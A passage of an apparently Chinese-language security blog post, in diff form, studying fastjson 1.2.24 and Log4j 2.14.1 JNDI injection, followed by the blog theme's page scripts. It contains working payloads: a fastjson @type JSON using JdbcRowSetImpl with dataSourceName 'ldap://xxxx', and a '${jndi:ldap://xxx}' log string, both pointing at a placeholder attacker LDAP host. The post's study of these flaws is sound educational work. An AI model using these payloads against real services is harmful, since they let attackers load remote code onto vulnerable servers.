class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到当我们传入的反序列化后成功触发</p>
+<p><img src="/../images/cc/f1.png" alt="1"></p>
+<p>我们来获取一下当前的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">    String test = &quot;  &#123;\&quot;name\&quot;: \&quot;Viper\&quot;,\n&quot; +</span><br><span class="line">            &quot;  \&quot;team\&quot;: \&quot;EDG2021\&quot;&#125;&quot;;</span><br><span class="line">    Object o = JSON.parseObject(test, Object.class);</span><br><span class="line">    System.out.println(o.getClass().getName());</span><br><span class="line">    </span><br><span class="line">    com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure>
+
+<p>打印出来是com.alibaba.fastjson.JSONObject</p>
+<p><img src="/../images/cc/f2.png" alt="1"></p>
+<h4 id="3：工作原理"><a href="#3：工作原理" class="headerlink" title="3：工作原理"></a>3：工作原理</h4><p>但是fastjson有一个特性可以指定类比如</p>
+<p>在文本那个加一个@type 就可以指定类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class evil &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        String test = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;  \&quot;@type\&quot; : \&quot;org.example.test2\&quot;,\n&quot; +</span><br><span class="line">                &quot;  \&quot;name\&quot;: \&quot;Viper\&quot;,\n&quot; +</span><br><span class="line">                &quot;  \&quot;team\&quot;: \&quot;EDG2021\&quot;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        Object o = JSON.parseObject(test, Object.class);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/cc/f3.png" alt="1"></p>
+<p>那么我们想fastjson是怎么赋值的吗 答案是也是和我们一样的new 一个对象然后调用 getName getAge&#x3D;xxx赋值所以它会调用构造方法和set方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class test2 &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public test2() &#123;</span><br><span class="line">        System.out.println(&quot;无参构造被触发了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        System.out.println(&quot;当前name是&quot; + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public test2(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/cc/f4.png" alt="1"></p>
+<p>可以看到他出发了getName 和 构造函数</p>
+<p>那么我们就可以找了能getName和构造方法能造成RCE的类</p>
+<p>注意了很关键和前面说的赋值一样</p>
+<p><code>本质是 **“根据 JSON 字符串动态创建对象并赋值”**，完全基于反射实现，不依赖 JDK 的序列化机制</code> 比如CC的序列化接口</p>
+<h4 id="4：找到漏洞类"><a href="#4：找到漏洞类" class="headerlink" title="4：找到漏洞类"></a>4：找到漏洞类</h4><p>在你传入的文本中fastjson是通过比如你传入</p>
+<p>name &#x3D; “God”</p>
+<p>他会加上get并把首字母大写来寻找set方法所以就变成了</p>
+<p>setName被执行了</p>
+<hr>
+<p>当然是有这个类的就是 JdbcRowSetlmpl</p>
+<p>进入后输入alt+7查看方法</p>
+<p><img src="/../images/cc/f5.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public void setAutoCommit(boolean var1) throws SQLException &#123;</span><br><span class="line">    if (this.conn != null) &#123;</span><br><span class="line">        this.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        this.conn = this.connect();</span><br><span class="line">        this.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们想要触发这个set只需要参数 autoCommit就可以了</p>
+<p>我们来观看这个代码</p>
+<p>在true中有一个connect方法</p>
+<p>里面直接有了jndi注入的函数两条</p>
+<p>this.getDataSourceName()换为JNDI注入的代码就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private Connection connect() throws SQLException &#123;</span><br><span class="line">    if (this.conn != null) &#123;</span><br><span class="line">        return this.conn;</span><br><span class="line">    &#125; else if (this.getDataSourceName() != null) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            InitialContext var1 = new InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());</span><br></pre></td></tr></table></figure>
+
+<p>所以我们手动构造值传入就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">  &quot;dataSourceName&quot;: &quot;ldap://xxxx&quot;,</span><br><span class="line">  &quot;autoCommit&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/cc/f6.png" alt="1"></p>
+<h3 id="三：LOG4J-jndi注入"><a href="#三：LOG4J-jndi注入" class="headerlink" title="三：LOG4J-jndi注入"></a>三：LOG4J-jndi注入</h3><h4 id="1：条件与POC"><a href="#1：条件与POC" class="headerlink" title="1：条件与POC"></a>1：条件与POC</h4><p>依赖如下小于2.14</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line">或者如果你没有源码--------------------------</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.yr&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4jjj&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!-- Log4j 核心二进制包（编译运行必需） --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">            &lt;!-- 不带 classifier，默认是二进制包 --&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- Log4j 核心源码包（仅用于查看源码，可选） --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">            &lt;classifier&gt;sources&lt;/classifier&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt; &lt;!-- 标记为“已提供”，不参与打包 --&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Log4j API 二进制包（编译运行必需） --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- Log4j API 源码包（仅用于查看源码，可选） --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">            &lt;classifier&gt;sources&lt;/classifier&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在resource下面创建l<code>og4j2.xml</code> 配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Configuration status=&quot;WARN&quot;&gt;</span><br><span class="line">    &lt;Appenders&gt;</span><br><span class="line">        &lt;!-- 输出到控制台 --&gt;</span><br><span class="line">        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class="line">        &lt;/Console&gt;</span><br><span class="line">    &lt;/Appenders&gt;</span><br><span class="line">    &lt;Loggers&gt;</span><br><span class="line">        &lt;!-- 根日志器，级别设为INFO --&gt;</span><br><span class="line">        &lt;Root level=&quot;info&quot;&gt;</span><br><span class="line">            &lt;AppenderRef ref=&quot;Console&quot;/&gt;</span><br><span class="line">        &lt;/Root&gt;</span><br><span class="line">    &lt;/Loggers&gt;</span><br><span class="line">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码如下</p>
+<p>$表示里面是需要被解析的变量</p>
+<p>jndi：表示用jndi组件去解析</p>
+<p>ldap表示jndi注入协议如rmi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static final Logger logger = LogManager.getLogger(test.class);</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        logger.info(&quot;hello world&quot;);</span><br><span class="line">        logger.info(&quot;$&#123;jndi:ldap://xxx&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/cc/l1.png" alt="1"></p>
+<h4 id="2：跟踪调试"><a href="#2：跟踪调试" class="headerlink" title="2：跟踪调试"></a>2：跟踪调试</h4><p>JNDI注入要看InitialContext.java下面的lookup方法</p>
+<p>我们打一个断点然后调试发现确实经过了</p>
+<p><img src="/../images/cc/l2.png" alt="1"></p>
+<p>发现变量覆盖过去</p>
+<p>通过变量赋值${}解析中间数值调用了JNDIlookup</p>
+<p><code>当变量表达式以 </code>jndi:<code>开头时（如</code>${jndi:ldap:&#x2F;&#x2F;…}<code>），Log4j 会调用 </code>JndiLookup<code>类的</code>lookup<code>方法，该类实现了</code>Lookup<code> 接口，专门处理 JNDI 相关的变量解析。</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public String lookup(final LogEvent event, final String key) &#123;</span><br><span class="line">    if (key == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    final String jndiName = convertJndiName(key);</span><br><span class="line">    try (final JndiManager jndiManager = JndiManager.getDefaultManager()) &#123;</span><br><span class="line">        return Objects.toString(jndiManager.lookup(jndiName), null);</span><br><span class="line">    &#125; catch (final NamingException e) &#123;</span><br><span class="line">        LOGGER.warn(LOOKUP, &quot;Error looking up JNDI resource [&#123;&#125;].&quot;, jndiName, e);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>License</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2025/11/04/posts/memory/">JAVA-内存马+servlet+Filter</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2025/10/29/posts/code3javaee/">JavaEE代码审计-鉴权逻辑</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><center>本站由 Starrui777使用 Stellar 1.33.1 主题创建。 </center>
+<center>
+</br>
+</br>
+<script type="text/javascript">
+function show_runtime() {
+    window.setTimeout("show_runtime()", 1000);
+    X = new Date("2/6/2026 14:57:10 ");
+    Y = new Date();
+    T = (Y.getTime() - X.getTime());
+    M = 24 * 60 * 60 * 1000;
+    a = T / M;
+    A = Math.floor(a);
+    b = (a - A) * 24;
+    B = Math.floor(b);
+    c = (b - B) * 60;
+    C = Math.floor((b - B) * 60);
+    D = Math.floor((c - C) * 60);
+    runtime_span.innerHTML = "⏲️ 本站已运行 " + A + "天|" + B + "小时|" + C + "分|" + D + "秒 ⏲️"
+}
+show_runtime();
+</script>
+<span id="runtime_span"> </span>
+</center>
+<span class="totalcount"> 共发表 90 篇 Blog · </span> <span class="post-count"> 总计 77.8k 字 </span></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaEECC%E9%93%BE%E6%9D%A1"><span class="toc-text">JavaEECC链条</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A-%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E7%9A%84CDK-8u65%E4%BB%A5%E5%8F%8ACC%E9%93%BE%E6%9D%A11"><span class="toc-text">一： 下载对应的CDK 8u65以及CC链条1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%89%8D%E6%8F%90"><span class="toc-text">一些前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9ATransformer%E6%8E%A5%E5%8F%A3%E4%B8%8E%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8"><span class="toc-text">1：Transformer接口与反射调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9A%E8%B0%81%E8%B0%83%E7%94%A8%E4%BA%86transform%E6%96%B9%E6%B3%95"><span class="toc-text">2：谁调用了transform方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9A%E8%B0%81%E8%B0%83%E7%94%A8%E4%BA%86setvalue"><span class="toc-text">3：谁调用了setvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-setValue%E5%80%BC%E6%80%8E%E4%B9%88%E6%8E%A7%E5%88%B6"><span class="toc-text">4.setValue值怎么控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-chainTransformer-%E9%93%BE%E5%9C%A8%E4%B8%80%E8%B5%B7"><span class="toc-text">5.chainTransformer 链在一起</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9Afastjson-1-2-24"><span class="toc-text">二：fastjson 1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%88%91%E4%BB%AC%E5%87%86%E5%A4%87%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84%E7%B1%BB"><span class="toc-text">1:我们准备一个恶意的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9A%E7%9C%8B%E7%9C%8B%E6%95%88%E6%9E%9C%E4%BB%A5%E5%8F%8Apoc"><span class="toc-text">2：看看效果以及poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%9A%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">3：工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%9A%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E7%B1%BB"><span class="toc-text">4：找到漏洞类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9ALOG4J-jndi%E6%B3%A8%E5%85%A5"><span class="toc-text">三：LOG4J-jndi注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%9A%E6%9D%A1%E4%BB%B6%E4%B8%8EPOC"><span class="toc-text">1：条件与POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%9A%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95"><span class="toc-text">2：跟踪调试</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"closeEnable":true,"closeText":"关闭提示","originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  window.canonical["param"] = {"permalink":"http://example.com/2025/10/29/posts/cc/","checklink":"/js/plugins/video.js"};
+  const ctx = {
+    date_suffix: {
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
